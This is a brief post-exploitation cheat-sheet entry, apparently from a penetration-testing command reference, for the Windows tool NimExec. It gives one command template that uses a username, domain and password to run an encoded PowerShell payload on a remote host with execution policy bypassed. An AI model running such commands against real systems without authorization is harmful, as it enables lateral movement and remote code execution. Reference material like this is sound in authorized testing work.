# Nimexec.exe
% windows, network

#plateform/windows #target/remote #cat/POSTEXPLOIT

## Remote - Exec command
```powershell
NimExec -u <user> -d <domain_fqdn> -p <password> -t <ip> -c "cmd.exe /c powershell - -exec bypass -nop -e <b64enc_payload>" -v
```
